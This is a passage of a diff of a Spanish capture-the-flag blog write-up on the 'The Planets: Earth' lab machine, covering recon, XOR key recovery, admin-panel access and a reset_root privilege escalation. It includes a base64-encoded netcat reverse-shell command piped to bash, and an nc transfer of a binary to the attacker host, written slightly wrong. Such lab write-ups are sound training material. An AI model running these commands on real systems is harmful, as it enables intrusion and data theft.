@@ -1,9 +1,9 @@
 <!doctype html><html lang=es-ES><head><title>The Planets: Earth &ndash; /dev/random</title><meta name=description content="Cultura hacker, software open source y arte hiperdigital"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=UTF-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin=anonymous referrerpolicy=no-referrer><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><link rel=stylesheet href=https://datadiego.github.io/css/palettes/gruvbox-dark.css><link rel=stylesheet href=https://datadiego.github.io/css/risotto.css><link rel=stylesheet href=https://datadiego.github.io/css/custom.css><link rel=stylesheet href=/css/syntax.css><script src=/js/copy-code.js defer></script><script src=/js/fuzzy-search.js defer></script><meta property="og:title" content="The Planets: Earth &ndash; /dev/random"><meta property="og:url" content="https://datadiego.github.io/posts/earth-vulnerable/"><meta property="og:description" content="Maquina vulnerable Earth &ndash; "><meta property="og:locale" content="es-ES"><meta property="og:image" content></head><body><div class=page><header class=page__header><div class=titlebar><span class=titlebar__path>/posts/earth-vulnerable</span></div><nav class="page__nav main-nav"><ul><li class=nomarker><h1 class=page__logo><a href=https://datadiego.github.io/ class=page__logo-inner>/dev/random</a></h1></li><li class=main-nav__item><a class=nav-main-item href=https://datadiego.github.io/posts title>/posts</a></li><li class=main-nav__item><a class=nav-main-item href=https://datadiego.github.io/projects title>/projects</a></li><li class=main-nav__item><a class=nav-main-item href=https://datadiego.github.io/about title>/about</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>The Planets: Earth</h1></header><div class=content__body><h2 id=datos-iniciales>Datos iniciales</h2><p>IP atacante: 10.0.5.43
-IP Victima: 10.0.6.13</p><h2 id=servicios>Servicios</h2><pre tabindex=0><code>PORT    STATE SERVICE
-22/tcp  open  ssh
-80/tcp  open  http
-443/tcp open  https
-</code></pre><h2 id=versiones>Versiones</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 8.6 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+IP Victima: 10.0.6.13</p><h2 id=servicios>Servicios</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PORT    STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp  open  ssh
+</span></span><span class=line><span class=cl>80/tcp  open  http
+</span></span><span class=line><span class=cl>443/tcp open  https
+</span></span></code></pre></div><h2 id=versiones>Versiones</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 8.6 <span class=o>(</span>protocol 2.0<span class=o>)</span>
 </span></span><span class=line><span class=cl>80/tcp  open  http     Apache httpd 2.4.51 <span class=o>((</span>Fedora<span class=o>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=o>)</span>
 </span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.51 <span class=o>(</span>Fedora<span class=o>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
 </span></span><span class=line><span class=cl>443/tcp open  ssl/http Apache httpd 2.4.51 <span class=o>((</span>Fedora<span class=o>)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=o>)</span>
@@ -20,54 +20,54 @@ IP Victima: 10.0.6.13</p><h2 id=servicios>Servicios</h2><pre tabindex=0><code>PO
 </span></span><span class=line><span class=cl>Aggressive OS guesses: Linksys WRT610Nv3 WAP <span class=o>(</span>91%<span class=o>)</span>, Linux 2.6.39 <span class=o>(</span>91%<span class=o>)</span>, Citrix Access Gateway VPN gateway <span class=o>(</span>90%<span class=o>)</span>, Linux 2.6.11 <span class=o>(</span>90%<span class=o>)</span>, Linux 2.6.18 <span class=o>(</span>90%<span class=o>)</span>, Linux 2.6.18.8 <span class=o>(</span>openSUSE 10.2<span class=o>)</span> <span class=o>(</span>90%<span class=o>)</span>, Linux 2.6.18.8 <span class=o>(</span>openSUSE 10.2, SMP<span class=o>)</span> <span class=o>(</span>90%<span class=o>)</span>, Linux 2.6.20.6 <span class=o>(</span>90%<span class=o>)</span>, Linux 2.6.23 <span class=o>(</span>90%<span class=o>)</span>, VMware ESX Server 3.0.2 <span class=o>(</span>90%<span class=o>)</span>
 </span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
 </span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
-</span></span></code></pre></div><p>Encontramos dos subdominios: <code>earth.local</code> y <code>terratest.earth.local</code>. Ambos apuntan a la misma IP.</p><p>Configuramos estos subdominios en nuestro archivo <code>/etc/hosts</code>.</p><h2 id=reconocimiento-servidor-web>Reconocimiento servidor web</h2><p>Al acceder a <code>earth.local</code> vemos una página web con un mensaje de bienvenida, un formulario para enviar mensajes a la Tierra encriptados y varios mensajes ya enviados:</p><pre tabindex=0><code>37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
-3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
-2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
-</code></pre><p>En <code>terratest.earth.local</code> usando https hay contenido en <code>/robots.txt</code>:</p><pre tabindex=0><code>User-Agent: *
-Disallow: /*.asp
-Disallow: /*.aspx
-Disallow: /*.bat
-Disallow: /*.c
-Disallow: /*.cfm
-Disallow: /*.cgi
-Disallow: /*.com
-Disallow: /*.dll
-Disallow: /*.exe
-Disallow: /*.htm
-Disallow: /*.html
-Disallow: /*.inc
-Disallow: /*.jhtml
-Disallow: /*.jsa
-Disallow: /*.json
-Disallow: /*.jsp
-Disallow: /*.log
-Disallow: /*.mdb
-Disallow: /*.nsf
-Disallow: /*.php
-Disallow: /*.phtml
-Disallow: /*.pl
-Disallow: /*.reg
-Disallow: /*.sh
-Disallow: /*.shtml
-Disallow: /*.sql
-Disallow: /*.txt
-Disallow: /*.xml
-Disallow: /testingnotes.*
-</code></pre><p>Entramos en <code>/testingnotes.txt</code> y encontramos:</p><pre tabindex=0><code>Testing secure messaging system notes:
-*Using XOR encryption as the algorithm, should be safe as used in RSA.
-*Earth has confirmed they have received our sent messages.
-*testdata.txt was used to test encryption.
-*terra used as username for admin portal.
-Todo:
-*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
-*Need to test different key lengths to protect against bruteforce. How long should the key be?
-*Need to improve the interface of the messaging interface and the admin panel, it&#39;s currently very basic.
-</code></pre><p>Entramos en <code>/testdata.txt</code> y encontramos:</p><pre tabindex=0><code>According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
-</code></pre><p>Por lo que vemos, estan usando un algoritmo de cifrado XOR para enviar mensajes a la Tierra. Encontramos un archivo de prueba <code>/testdata.txt</code> que es el mensaje que estan usando para probar el cifrado.</p><p>En la página podemos ver el resultado de haber pasado <code>testdata.txt</code> por el algoritmo de cifrado XOR.</p><h2 id=vulnerabilidad-en-cifrado-xor>Vulnerabilidad en cifrado XOR</h2><p>XOR es vulnerable a un ataque de texto plano conocido. Si conocemos el texto plano y el texto cifrado, podemos recuperar la clave.</p><p>Ejemplo:</p><pre tabindex=0><code>Texto: &#34;hola mundo&#34;
-Clave: 1234
-Cifrado: 7a5b7e553259675a765b
-</code></pre><p>Si introducimos como input &ldquo;hola mundo&rdquo; y como clave obtenemos &ldquo;1234&rdquo;, el resultado es &ldquo;7a5b7e553259675a765b&rdquo;.</p><p>En este caso podemos poner el texto encontrado y la version encriptada que encontramos en la pagina principal para obtener:</p><pre tabindex=0><code>earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
-</code></pre><p>De aqui podemos deducir que la clave usada es <code>earthclimatechangebad4humans</code></p><h2 id=fuzzing-web>fuzzing web</h2><p>Usaremos ffuf para fuzzear la web y encontrar posibles rutas ocultas.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://terratest.earth.local/FUZZ/ -c -v
+</span></span></code></pre></div><p>Encontramos dos subdominios: <code>earth.local</code> y <code>terratest.earth.local</code>. Ambos apuntan a la misma IP.</p><p>Configuramos estos subdominios en nuestro archivo <code>/etc/hosts</code>.</p><h2 id=reconocimiento-servidor-web>Reconocimiento servidor web</h2><p>Al acceder a <code>earth.local</code> vemos una página web con un mensaje de bienvenida, un formulario para enviar mensajes a la Tierra encriptados y varios mensajes ya enviados:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
+</span></span><span class=line><span class=cl>3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
+</span></span><span class=line><span class=cl>2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
+</span></span></code></pre></div><p>En <code>terratest.earth.local</code> usando https hay contenido en <code>/robots.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>User-Agent: *
+</span></span><span class=line><span class=cl>Disallow: /*.asp
+</span></span><span class=line><span class=cl>Disallow: /*.aspx
+</span></span><span class=line><span class=cl>Disallow: /*.bat
+</span></span><span class=line><span class=cl>Disallow: /*.c
+</span></span><span class=line><span class=cl>Disallow: /*.cfm
+</span></span><span class=line><span class=cl>Disallow: /*.cgi
+</span></span><span class=line><span class=cl>Disallow: /*.com
+</span></span><span class=line><span class=cl>Disallow: /*.dll
+</span></span><span class=line><span class=cl>Disallow: /*.exe
+</span></span><span class=line><span class=cl>Disallow: /*.htm
+</span></span><span class=line><span class=cl>Disallow: /*.html
+</span></span><span class=line><span class=cl>Disallow: /*.inc
+</span></span><span class=line><span class=cl>Disallow: /*.jhtml
+</span></span><span class=line><span class=cl>Disallow: /*.jsa
+</span></span><span class=line><span class=cl>Disallow: /*.json
+</span></span><span class=line><span class=cl>Disallow: /*.jsp
+</span></span><span class=line><span class=cl>Disallow: /*.log
+</span></span><span class=line><span class=cl>Disallow: /*.mdb
+</span></span><span class=line><span class=cl>Disallow: /*.nsf
+</span></span><span class=line><span class=cl>Disallow: /*.php
+</span></span><span class=line><span class=cl>Disallow: /*.phtml
+</span></span><span class=line><span class=cl>Disallow: /*.pl
+</span></span><span class=line><span class=cl>Disallow: /*.reg
+</span></span><span class=line><span class=cl>Disallow: /*.sh
+</span></span><span class=line><span class=cl>Disallow: /*.shtml
+</span></span><span class=line><span class=cl>Disallow: /*.sql
+</span></span><span class=line><span class=cl>Disallow: /*.txt
+</span></span><span class=line><span class=cl>Disallow: /*.xml
+</span></span><span class=line><span class=cl>Disallow: /testingnotes.*
+</span></span></code></pre></div><p>Entramos en <code>/testingnotes.txt</code> y encontramos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Testing secure messaging system notes:
+</span></span><span class=line><span class=cl>*Using XOR encryption as the algorithm, should be safe as used in RSA.
+</span></span><span class=line><span class=cl>*Earth has confirmed they have received our sent messages.
+</span></span><span class=line><span class=cl>*testdata.txt was used to test encryption.
+</span></span><span class=line><span class=cl>*terra used as username for admin portal.
+</span></span><span class=line><span class=cl>Todo:
+</span></span><span class=line><span class=cl>*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
+</span></span><span class=line><span class=cl>*Need to test different key lengths to protect against bruteforce. How long should the key be?
+</span></span><span class=line><span class=cl>*Need to improve the interface of the messaging interface and the admin panel, it&#39;s currently very basic.
+</span></span></code></pre></div><p>Entramos en <code>/testdata.txt</code> y encontramos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
+</span></span></code></pre></div><p>Por lo que vemos, estan usando un algoritmo de cifrado XOR para enviar mensajes a la Tierra. Encontramos un archivo de prueba <code>/testdata.txt</code> que es el mensaje que estan usando para probar el cifrado.</p><p>En la página podemos ver el resultado de haber pasado <code>testdata.txt</code> por el algoritmo de cifrado XOR.</p><h2 id=vulnerabilidad-en-cifrado-xor>Vulnerabilidad en cifrado XOR</h2><p>XOR es vulnerable a un ataque de texto plano conocido. Si conocemos el texto plano y el texto cifrado, podemos recuperar la clave.</p><p>Ejemplo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Texto: &#34;hola mundo&#34;
+</span></span><span class=line><span class=cl>Clave: 1234
+</span></span><span class=line><span class=cl>Cifrado: 7a5b7e553259675a765b
+</span></span></code></pre></div><p>Si introducimos como input &ldquo;hola mundo&rdquo; y como clave obtenemos &ldquo;1234&rdquo;, el resultado es &ldquo;7a5b7e553259675a765b&rdquo;.</p><p>En este caso podemos poner el texto encontrado y la version encriptada que encontramos en la pagina principal para obtener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
+</span></span></code></pre></div><p>De aqui podemos deducir que la clave usada es <code>earthclimatechangebad4humans</code></p><h2 id=fuzzing-web>fuzzing web</h2><p>Usaremos ffuf para fuzzear la web y encontrar posibles rutas ocultas.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://terratest.earth.local/FUZZ/ -c -v
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=o>[</span>Status: 200, Size: 306, Words: 22, Lines: 16, Duration: 945ms<span class=o>]</span>
 </span></span><span class=line><span class=cl><span class=p>|</span> URL <span class=p>|</span> http://terratest.earth.local/admin/
@@ -85,10 +85,10 @@ Cifrado: 7a5b7e553259675a765b
 </span></span></code></pre></div><p>Esto nos devolvera una cadena en b64, si ejecutamos lo siguiente en el panel de admin:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMTIuMjUgMTIzNAo=&#39;</span> <span class=p>|</span> base64 -d <span class=p>|</span> bash
 </span></span></code></pre></div><p>Obtendremos una shell inversa en nuestra máquina.</p><h2 id=escalada-de-privilegios>Escalada de privilegios</h2><p>Podemos usar <code>find / -perm -u=s -type f 2>/dev/null</code> para encontrar archivos con permisos de setuid. Estos archivos pueden ser ejecutados con los permisos del dueño del archivo.</p><p>Encontramos <code>/usr/bin/reset_root</code>, un archivo que podemos ejecutar con permisos de root.</p><p>Sin embargo al intentar ejecutarlo nos dice que no tenemos todos los triggers configurados. Es decir, necesitamos crear varios archivos o directorios antes de poder ejecutarlo.</p><p>Podemos intentar leer el archivo en busca de pistas con <code>strings /usr/bin/reset_root</code>, pero el archivo es demasiado grande.</p><p>Si usamos <code>ltrace /usr/bin/reset_root</code> desde la maquina victima vemos que no tenemos ltrace instalado, debemos enviarnoslo por nc a nuestra maquina:</p><p>En la maquina que recibe el archivo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvpn <span class=m>8888</span> &gt; reset_root
 </span></span></code></pre></div><p>En la maquina victima</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /usr/bin/reset_root &gt; nc 10.0.12.25 <span class=m>8888</span>
-</span></span></code></pre></div><p>Lo descargamos, damos permisos de ejecucion, vemos con ltrace que faltan los siguientes archivos:</p><pre tabindex=0><code>access(&#34;/dev/shm/kHgTFI5G&#34;, 0)        = -1
-access(&#34;/dev/shm/Zw7bV9U5&#34;, 0)        = -1
-access(&#34;/tmp/kcM0Wewe&#34;, 0)            = -1
-</code></pre><p>Los creamos con:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir /dev/shm/kHgTFI5G
+</span></span></code></pre></div><p>Lo descargamos, damos permisos de ejecucion, vemos con ltrace que faltan los siguientes archivos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>access(&#34;/dev/shm/kHgTFI5G&#34;, 0)        = -1
+</span></span><span class=line><span class=cl>access(&#34;/dev/shm/Zw7bV9U5&#34;, 0)        = -1
+</span></span><span class=line><span class=cl>access(&#34;/tmp/kcM0Wewe&#34;, 0)            = -1
+</span></span></code></pre></div><p>Los creamos con:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir /dev/shm/kHgTFI5G
 </span></span><span class=line><span class=cl>mkdir /dev/shm/Zw7bV9U5
 </span></span><span class=line><span class=cl>mkdir <span class=s2>&#34;/tmp/kcM0Wewe&#34;</span>
 </span></span></code></pre></div><p>Ejecutamos <code>reset_root</code> y vemos que la contraseña se ha reseteado a <code>Earth</code>.</p><p>Podemos entrar con <code>su root</code>, aunque deberás ejecutar:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script /dev/null -c bash
